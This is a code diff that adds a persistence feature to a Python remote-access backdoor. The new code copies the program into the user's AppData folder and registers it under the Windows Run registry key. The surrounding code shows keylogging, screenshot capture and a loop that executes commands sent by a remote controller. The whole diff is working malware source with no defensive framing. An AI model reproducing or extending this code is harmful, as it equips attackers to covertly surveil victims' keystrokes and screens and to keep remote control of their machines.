@@ -5,6 +5,8 @@ import os
 import pyautogui
 import keylogger
 import threading
+import shutil
+import sys
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -40,6 +42,19 @@ def screenshot():
     myScreenshot = pyautogui.screenshot()
     myScreenshot.save('screen.png')
 
+def persist(reg_name, copy_name):
+    file_location = os.environ['appdata'] + '\\' + copy_name
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d | "' + file_location + '"', shell=True)
+            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
+        else:
+            reliable_send('[+] Persistence Alreadt Exists')
+    except:
+        reliable_send('[+] Error Creating Persistence With The Machine')
+            
+
 def shell():
     count = 0
     while True:
@@ -72,6 +87,9 @@ def shell():
             keylog.self_destruct()
             t.join()
             reliable_send('[+] Keylogger Stopped!')
+        elif command[:11] == 'persistence':
+            reg_name, copy_name = command[12:].split(' ')
+            persist(reg_name, copy_name)
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
